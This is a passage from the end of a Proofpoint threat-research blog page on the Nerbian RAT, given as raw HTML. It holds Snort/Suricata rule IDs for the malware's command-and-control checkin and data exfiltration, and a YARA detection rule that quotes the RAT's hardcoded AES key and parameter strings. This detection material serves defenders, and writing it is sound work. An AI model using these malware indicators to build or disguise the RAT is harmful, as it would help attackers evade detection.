			<p paraeid="{850e0540-7d9a-4dbe-8c20-3ee40ae01254}{90}" paraid="179800630">Additional IP address identified in the Nerbian RAT (MoUsoCore.exe) configuration.&nbsp;</p>
			</td>
		</tr>
	</tbody>
</table>

<p style="margin-bottom:11px"><br>
<b style="color: rgb(47, 84, 150); font-family: &quot;Calibri Light&quot;, sans-serif; font-size: 16pt;"><span style="font-size:14.0pt"><span style="line-height:107%"><span style="font-family:Helvetica"><span style="color:black">Detection</span></span></span></span></b></p>

<p style="margin-bottom:11px">&nbsp;</p>

<p style="margin-bottom:11px"><span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><b>Network</b></span></span></span></p>

<p style="margin-bottom:11px"><span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-family:Helvetica">Snort and Suricata rules are available in the ETOPEN ruleset under SIDs:</span><br>
<span style="font-family:Helvetica">2036426 - ET MALWARE Nerbian RAT CnC Checkin</span><br>
<span style="font-family:Helvetica">2036427 - ET MALWARE Nerbian RAT Data Exfiltration</span></span></span></span></p>

<p style="margin-bottom:11px"><span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><b>Static</b></span></span></span></p>

<p style="margin-bottom:11px"><span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-family:Helvetica">The Yara rule below should provide host-based static detection of the RAT payload:</span></span></span></span></p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">rule Nerbian_RAT</span></span></span></span></span></p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">{</span></span></span></span></span></p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp; meta: </span></span></span></span></span></p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; author = "ptrouerbach"</span></span></span></span></span></p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reference = "5e6c5a9fda2d20125f6f24e37e8a217a39ff0a5cfddc07ddfdb18049d9ea4597"</span></span></span></span></span></p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; malfamily = "NerbianRAT"</span></span></span></span></span></p>

<p>&nbsp;</p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp; strings:</span></span></span></span></span></p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $args_p = "p-" ascii</span></span></span></span></span></p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $args_s = "s-" ascii</span></span></span></span></span></p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $args_h = "h-" ascii</span></span></span></span></span></p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $args_P = "P-" ascii</span></span></span></span></span></p>

<p>&nbsp;</p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $hardcoded_aes_key = { 17E87F581F1DF8D6129D65FD50CEB3DD6C4E1C223077CD7D4C595DA6C3DF92B2 } </span></span></span></span></span></p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span></p>

<p style="text-indent:.5in"><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">&nbsp;$param_auth = "auth_post" ascii</span></span></span></span></span></p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $param_session = "session_key" ascii</span></span></span></span></span></p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $param_data = "data_post" ascii</span></span></span></span></span></p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $param_addr = "addr_post" ascii</span></span></span></span></span></p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $param_port = "port_post" ascii</span></span></span></span></span></p>

<p>&nbsp;</p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp; condition:</span></span></span></span></span></p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uint16be(0) == 0x4D5A </span></span></span></span></span></p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and ($hardcoded_aes_key or (all of ($param*) and all of ($args*)))</span></span></span></span></span></p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and filesize &lt; 10MB</span></span></span></span></span></p>

<p><span style="font-size:11pt"><span style="line-height:normal"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="font-family:Consolas">}</span></span></span></span></span></p>

<p><strong>Additional Acknowledgements</strong></p>

<p>Proofpoint security researchers would like to thank security researcher pr0xylife sharing his observations of this threat on social media.</p>

</div>
  </div>

      <div class="blog__content-pager">
      
  <div class="content-pager _legacy_blocks _content_pager">
    <div class="content-pager__items-wrapper">
      <div class="content-pager__items">
        <div class="content-pager__item content-pager__item--prev">
          <a href="/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques" hreflang="en">Previous Blog Post</a>
        </div>
        <div class="content-pager__item content-pager__item--next">
          <a href="/us/blog/threat-insight/how-cyber-criminals-target-cryptocurrency" hreflang="en">Next Blog Post</a>
        </div>
      </div>
    </div>
  </div>

    </div>
        




  
        
<div class="subscribe-block blog-subscribe _legacy_blocks _subscribe-block subscribe-block--black blog-subscribe--black v3-dark-bg-only" data-animate="true">
  <div class="subscribe-block__inner blog-subscribe__inner">
    <div class="subscribe-block__copy">
      

      
<h3 class="subscribe-block__heading">
      Subscribe to the Proofpoint Blog
  </h3>

          </div>
    <div class="subscribe-block__form">
        <div class="mk-form">
  <div class="mk-form__form-container _legacy_element _marketo_form">
    <script type="IN/Form2"
      data-data-form="mktoForm_19277"
      data-field-firstname="FirstName"
      data-field-lastname="LastName"
      data-field-email="Email"
      data-field-company="Company"
      data-field-title="Title"
      data-field-state="State"
      data-field-country="Country"
    ></script>
    <form
      id="mktoForm_19277"
      data-mkto-id="19277"
      data-mkto-base="//go.proofpoint.com"
      data-munchkin-id="309-RHV-619"
      data-submit-text=""
      data-redirect-link=""
      data-prefill=""
      data-event-label=""
      data-lang-code="us"
      data-validate-email="1"
      class="mk-form__form marketo-form-block__form"
    ></form>
  </div>
</div>


    </div>
  </div>
</div>



  </article>


  </div>

  </div>

      </div>
    </section>
  </main>

</div>

  
<div  class="footer-v3 footer-v3--cta" data-animate="true">
  <div class="footer-v3__wrapper">
    <div class="footer-v3__inner">
              <section class="footer-v3__cta-wrapper">
  <div class="footer-v3__cta">
    <img src="/themes/custom/proofpoint/dist/app-drupal/assets/footer_contact.webp" >
    <div class="footer-v3__cta-inner">
      <h2 class="footer-v3__cta-text">Turn <em>people</em> into your <em>best defense</em> with Proofpoint</h2>
      

  


<a href="/us/contact" class="global-elements__cta global-elements__cta-btn global-elements__cta global-elements__cta-btn--green global-elements__cta global-elements__cta-btn footer-v3__cta-link" >
      Get in Touch
    </a>

    </div>
  </div>
</section>
            <section class="footer-v3__content">
                  <nav class="footer-v3__nav">
            <div class="footer-v3__nav-wrapper">
              <div class="footer-v3__nav-heading">Products</div>
              <ul class="footer-v3__nav-collapsible">
                <li class="footer-v3__nav-collapsible-list"><a href="/us/products/protect-people">Protect People</a></li>
                <li class="footer-v3__nav-collapsible-list"><a href="/us/products/defend-data">Defend Data</a></li>
                <li class="footer-v3__nav-collapsible-list"><a href="/us/products/mitigate-human-risk">Mitigate Human Risk</a></li>
                <li class="footer-v3__nav-collapsible-list"><a href="/us/products/premium-services">Premium Services</a></li>
              </ul>
            </div>
            <div class="footer-v3__nav-wrapper">
              <div class="footer-v3__nav-heading">Get Support</div>
              <ul class="footer-v3__nav-collapsible">
                <li class="footer-v3__nav-collapsible-list"><a href="https://proofpoint.my.site.com/community/s/" target="_blank">Product Support Login</a></li>
                <li class="footer-v3__nav-collapsible-list"><a href="/us/support-services">Support Services</a></li>
                <li class="footer-v3__nav-collapsible-list"><a href="/us/ipcheck">IP Address Blocked?</a></li>
              </ul>
            </div>
            <div class="footer-v3__nav-wrapper">
              <div class="footer-v3__nav-heading">More</div>
              <ul class="footer-v3__nav-collapsible">
                <li class="footer-v3__nav-collapsible-list"><a href="/us/company/about">About Proofpoint</a></li>
                <li class="footer-v3__nav-collapsible-list"><a href="/us/why-proofpoint">Why Proofpoint</a></li>
                <li class="footer-v3__nav-collapsible-list"><a href="/us/company/careers">Careers</a></li>
                <li class="footer-v3__nav-collapsible-list"><a href="/us/leadership-team">Leadership Team</a></li>
                <li class="footer-v3__nav-collapsible-list"><a href="/us/newsroom">News Center</a></li>
                <li class="footer-v3__nav-collapsible-list"><a href="/us/legal/trust">Privacy and Trust</a></li>
              </ul>
            </div>
            <div class="footer-v3__nav-wrapper">
              <div class="footer-v3__nav-heading">Connect with Us</div>
              <ul class="footer-v3__nav-collapsible">
                <li class="footer-v3__nav-collapsible-list">
                  <ul class="footer-v3__bottom-social-menu">
                    <li>
                      <a href="http://www.facebook.com/proofpoint" class="icon-facebook" target="_blank"></a>
                    </li>
                    <li>
                      <a href="https://x.com/proofpoint" class="icon-twitter" target="_blank"></a>
                    </li>
                    <li>
                      <a href="https://www.linkedin.com/company/proofpoint" class="icon-linkedin" target="_blank"></a>
                    </li>
                    <li>
                      <a href="https://www.youtube.com/channel/UCIvtJgsrUzFo90NKeiVozhQ" class="icon-youtube-play" target="_blank"></a>
                    </li>
                    <li>
                      <a href="https://www.instagram.com/proofpoint" class="icon-instagram" target="_blank"></a>
                    </li>
                  </ul>
                </li>              
                <li class="footer-v3__nav-collapsible-list"><a href="tel:+1-408-517-4710">+1 408 517 4710</a></li>
                <li class="footer-v3__nav-collapsible-list"><a href="/us/events">Attend an Event</a></li>
                <li class="footer-v3__nav-collapsible-list"><a href="/us/contact">Contact Us</a></li>
                <li class="footer-v3__nav-collapsible-list"><a href="/us/free-demo-request">Free Demo Request</a></li>
              </ul>
            </div>            
          </nav>
                <div class="footer-v3__bottom-wrap">
          <section class="footer-v3__bottom">
            <div class="footer-v3__logo">
              <a href="/us" class="footer-v3__logo-link">
                <div class="footer-v3__logo-image"></div>
              </a>
            </div>
            <div class="footer-v3__bottom-copyright">
              <div class="footer-v3__bottom-copyright-reserve">&copy;
                2025.
                All rights reserved.
              </div>
              <a class="footer-v3__bottom-copyright-info" href="/us/legal/license">Terms and conditions</a>
              <a class="footer-v3__bottom-copyright-info" href="/us/legal/privacy-policy">Privacy Policy</a>
              <a class="footer-v3__bottom-copyright-info" href="/us/sitemap">Sitemap</a>
            </div>
          </section>
        </div>
      </section>
    </div>
  </div>
</div>


  </div>

      <script type="text/javascript">document.write(unescape("%3Cscript src='//munchkin.marketo.net/munchkin.js' type='text/javascript'%3E%3C/script%3E")); </script> <script>Munchkin.init('309-RHV-619');</script><div class="element-invisible" style="clear:both;"><!-- Google Code for Remarketing Tag -->
                <!--------------------------------------------------
                Remarketing tags may not be associated with personally identifiable information or placed on pages related to sensitive categories. See more information and instructions on how to setup the tag on: http://google.com/ads/remarketingsetup
                --------------------------------------------------->
                <script type="text/javascript">
                /* <![CDATA[ */
                var google_conversion_id = 950296937;
                var google_custom_params = window.google_tag_params;
                var google_remarketing_only = true;
                /* ]]> */
                </script>
                <script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
                </script>
                <noscript>
                <div style="display:inline;">
                <img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/950296937/?value=0&amp;guid=ON&amp;script=0"/>
                </div>
                </noscript></div>
    </div>
    <div id="flyout-container"></div>
    <script type="application/json" data-drupal-selector="drupal-settings-json">{"path":{"baseUrl":"\/","pathPrefix":"us\/","currentPath":"node\/116846","currentPathIsAdmin":false,"isFront":false,"currentLanguage":"en"},"pluralDelimiter":"\u0003","suppressDeprecationErrors":true,"ajaxPageState":{"libraries":"eJxVj0GOBCEIRS9Uxkxm07eZgE2rKQWD2EnffqxadFkbEh7w_6eBWg6FPBYJu-sDe9CM5HCYCW9tmcd7dy0vXAmeQUfFfsEgbMTmGkTSFety-RIxUvf-vVAsglAcFarzfBGMIrGQe8mNpmk9FRjed5Z5Cb48eDy8tfaXfx7sC3AcM597klEw0WNSQXcy8XVwSHvmg3UCDckPy6WffQKdske1lE9kaQb2BsiAeLp_mUhB0K1_ulH1CJ3-Ae6OlH4","theme":"particle","theme_token":null},"ajaxTrustedUrl":[],"vwo":{"id":1002484,"timeout_library":2500,"timeout_setting":2000,"usejquery":"false","testnull":null},"pp_i18n":{"language":"us"},"instantsearch":{"indexName":"content","path":"us\/search"},"node":{"contentType":"Blog post"},"user":{"uid":0,"permissionsHash":"d2c690dc50aab9a747cb007581c42f03855e8fe2ed922e6706b178b00522f212"}}</script>
<script src="/sites/default/files/js/js_BREGeiuYIEL325Hk9gcolX-t2EH78QcMyXvbI79KvgM.js?scope=footer&amp;delta=0&amp;language=en&amp;theme=particle&amp;include=eJxNjVEKwzAMQy-0Yva32xTH82LTxA6Oc_-tZbD9CCTxpDF2vT8MGlpdWHl7cjKlx22MvWMcnA59GcmhdmaTMUhgpbZ5-hTuDOneCn4gjFRqDOTBfzUWw1LU6jUhGAyXpuj8Qd-_7eXR38ApO00"></script>
<script src="https://geoip-js.com/js/apis/geoip2/v2.1/geoip2.js"></script>
<script src="/sites/default/files/js/js_dfzxI1kBLIpbsNtAM8XOdI0AdbyzPfJ9AFJNYycoYfA.js?scope=footer&amp;delta=2&amp;language=en&amp;theme=particle&amp;include=eJxNjVEKwzAMQy-0Yva32xTH82LTxA6Oc_-tZbD9CCTxpDF2vT8MGlpdWHl7cjKlx22MvWMcnA59GcmhdmaTMUhgpbZ5-hTuDOneCn4gjFRqDOTBfzUWw1LU6jUhGAyXpuj8Qd-_7eXR38ApO00"></script>
<script src="//munchkin.marketo.net/munchkin.js"></script>
<script src="/sites/default/files/js/js_HnMsPzVfQSIeXcNjXKWxZddMwkcDzHHDEtnLXwCC9pg.js?scope=footer&amp;delta=4&amp;language=en&amp;theme=particle&amp;include=eJxNjVEKwzAMQy-0Yva32xTH82LTxA6Oc_-tZbD9CCTxpDF2vT8MGlpdWHl7cjKlx22MvWMcnA59GcmhdmaTMUhgpbZ5-hTuDOneCn4gjFRqDOTBfzUWw1LU6jUhGAyXpuj8Qd-_7eXR38ApO00"></script>
<script src="/themes/custom/proofpoint/apps/drupal/../../dist/app-drupal/assets/js/app.js?q=mSbGlXKPGDc&amp;v=1"></script>
<script src="/sites/default/files/js/js_pfrkqdx6Q66OnEMVhuxrZmxB1qwArkX6ss8QB2W__eo.js?scope=footer&amp;delta=6&amp;language=en&amp;theme=particle&amp;include=eJxNjVEKwzAMQy-0Yva32xTH82LTxA6Oc_-tZbD9CCTxpDF2vT8MGlpdWHl7cjKlx22MvWMcnA59GcmhdmaTMUhgpbZ5-hTuDOneCn4gjFRqDOTBfzUWw1LU6jUhGAyXpuj8Qd-_7eXR38ApO00"></script>
<script src="//go.proofpoint.com/js/forms2/js/forms2.min.js"></script>

    <script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","licenseKey":"NRJS-dc609d42ed81d429509","applicationID":"981470745","transactionName":"ZAdTbEEEChJRBxFcVl1Nck1AEQsMHwoKUVwdAF1XVDoUDkMQ","queueTime":0,"applicationTime":890,"atts":"SEBEGgkeGU0SBUcPQk4f","errorBeacon":"bam.nr-data.net","agent":""}</script>
  </body>
</html>
